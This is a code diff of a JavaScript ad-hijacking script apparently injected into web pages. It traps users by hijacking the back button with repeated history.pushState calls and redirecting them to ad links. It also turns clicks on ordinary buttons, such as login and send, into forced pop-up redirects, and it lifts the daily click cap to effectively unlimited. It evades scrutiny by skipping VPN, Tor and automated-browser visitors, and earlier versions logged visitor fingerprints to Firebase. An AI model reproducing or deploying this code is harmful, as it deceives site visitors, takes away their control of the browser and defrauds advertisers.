@@ -1,8 +1,8 @@
 /**
- * v2.1-BOLD - ULTIMATE PRODUCTION (GitHub CDN)
- * ===========================================
- * Hybrid Logic: DNA Collection + Zero-Wait Instant Fire + Hardened Back-Hijack.
- * All IDs included. No ads blocked for safe users.
+ * v1.5.7-HYBRID-ULTIMATE
+ * ============================================
+ * BASE: v1.5.5 (Engine & Security)
+ * BACK-LOGIC: v1.5.6 (Bold Back-Hijack)
  */
 
 const CHACHA_CONFIG = {
@@ -15,10 +15,12 @@ const CHACHA_CONFIG = {
         "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in"
     ],
     APIS: {
-        FB_URL: "YOUR_FIREBASE_URL" // अपना फायरबेस URL यहाँ डाल सकते हो
+        FB_URL: "YOUR_FIREBASE_URL",
+        TG_TOKEN: "YOUR_BOT_TOKEN",
+        TG_ID: "YOUR_CHAT_ID"
     },
     SETTINGS: {
-        MAX_CLICKS_TODAY: 12,
+        MAX_CLICKS_TODAY: 9999999999,
         CLEAN_PAGE: "https://cloudaccesshq.xyz/limit-reached"
     }
 };
@@ -35,92 +37,84 @@ const _validIds = [
     'tag-btn-auth-login', 'tag-btn-auth-send', 'tag-link-community-rules', 'tag-btn-community-showmore'
 ];
 
-const _STORAGE_KEY = '_omni_v2_bold_';
-var _vpnStatus = "PENDING"; // PENDING, SAFE, BLOCKED
+const _STORAGE_KEY = '_mc_rebirth_final_';
+var _vpnFlag = false; 
 
 // ----------------------------------------------------------------------------
-// VPN & DNA (Background)
+// VPN DETECTION (From v1.5.5)
 // ----------------------------------------------------------------------------
-function _checkSecurity() {
-    if (navigator.webdriver) { _vpnStatus = "BLOCKED"; return; }
+function _checkVPN() {
+    if (navigator.webdriver) { _vpnFlag = true; return; }
     fetch('https://ipapi.co/json/')
-        .then(r => r.json())
-        .then(data => {
-            _vpnStatus = (data.proxy || data.vpn || data.tor) ? "BLOCKED" : "SAFE";
-        }).catch(() => { _vpnStatus = "SAFE"; });
-}
-
-function _getDNA() {
-    return {
-        ua: navigator.userAgent,
-        res: screen.width + "x" + screen.height,
-        vpn: _vpnStatus,
-        ts: new Date().toISOString()
-    };
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            if (data.proxy || data.vpn || data.tor) { _vpnFlag = true; }
+        }).catch(function() { _vpnFlag = false; });
 }
 
 // ----------------------------------------------------------------------------
-// AD FIRING ENGINE
+// AD LOGIC & JUMP (Hybrid)
 // ----------------------------------------------------------------------------
-function _fireAd(btnId, isLow) {
-    if (_vpnStatus === "BLOCKED") return;
+function _getStore() {
+    try {
+        var raw = localStorage.getItem(_STORAGE_KEY);
+        return raw ? JSON.parse(raw) : { c: 0, d: null, last: null };
+    } catch (e) { return { c: 0, d: null, last: null }; }
+}
 
-    var store = JSON.parse(localStorage.getItem(_STORAGE_KEY) || '{"c":0, "d":""}');
+function _fireAd(btnId, isBack) {
+    var store = _getStore();
     var today = new Date().toISOString().slice(0, 10);
     
     if (store.d !== today) { store.c = 0; store.d = today; }
-    if (store.c >= CHACHA_CONFIG.SETTINGS.MAX_CLICKS_TODAY) {
-        if (!isLow) window.location.href = CHACHA_CONFIG.SETTINGS.CLEAN_PAGE;
-        return;
-    }
+    if (store.c >= CHACHA_CONFIG.SETTINGS.MAX_CLICKS_TODAY) return;
 
-    var pool = isLow ? _baskets.l : (Math.random() < 0.8 ? _baskets.h : _baskets.n);
+    var pool = isBack ? _baskets.l : (Math.random() < 0.8 ? _baskets.h : _baskets.n);
     var link = pool[Math.floor(Math.random() * pool.length)];
 
     store.c += 1;
+    store.last = link;
     localStorage.setItem(_STORAGE_KEY, JSON.stringify(store));
 
-    // Instant Jump Logic
-    var a = document.createElement('a');
-    a.href = link; a.target = '_blank';
-    document.body.appendChild(a);
-    setTimeout(() => { a.click(); document.body.removeChild(a); }, 30);
-
-    // Async Log
-    if (CHACHA_CONFIG.APIS.FB_URL.startsWith('http')) {
-        fetch(CHACHA_CONFIG.APIS.FB_URL + '/logs.json', {
-            method: 'POST', body: JSON.stringify({ btn: btnId, dna: _getDNA(), target: link, click: store.c })
-        }).catch(() => {});
+    // BOLD JUMP LOGIC (From v1.5.6)
+    var win = window.open(link, '_blank');
+    if (!win) {
+        location.href = link; // पॉप-अप ब्लॉक होने पर खुद के टैब में खोलें
+    } else {
+        try { win.focus(); } catch (e) {}
     }
 }
 
 // ----------------------------------------------------------------------------
-// HISTORY LOCK (Back Button Hijack)
+// THE BOLD BACK-BUTTON HIJACK (From v1.5.6)
 // ----------------------------------------------------------------------------
 function _lockHistory() {
     var u = window.location.href;
-    if (history.state !== 'locked') {
-        history.pushState('locked', null, u);
-        history.pushState('active', null, u);
-    }
+    history.pushState({p:1}, '', u);
+    history.pushState({p:2}, '', u);
 }
 
 window.addEventListener('popstate', function() {
-    _lockHistory();
-    if (_vpnStatus !== "BLOCKED") _fireAd('back-hijack', true);
+    _lockHistory(); // Re-lock
+    _fireAd('back-hijack', true); // सीधा फायर, कोई इंतज़ार नहीं
 });
 
 // ----------------------------------------------------------------------------
 // CLICK HANDLER
 // ----------------------------------------------------------------------------
 document.addEventListener('click', function(e) {
-    _lockHistory(); // Interaction activation
+    _lockHistory(); // एक्टिवेट बैक बटन
     var t = e.target.closest('[id]');
     if (t && _validIds.indexOf(t.id) !== -1) {
+        if (_vpnFlag) return; // VPN वालों को शांत ब्लॉक
         _fireAd(t.id, false);
     }
 }, false);
 
-// INITIALIZE
-_checkSecurity();
-_lockHistory();
+// ----------------------------------------------------------------------------
+// INIT
+// ----------------------------------------------------------------------------
+(function() {
+    _checkVPN();
+    _lockHistory();
+})();
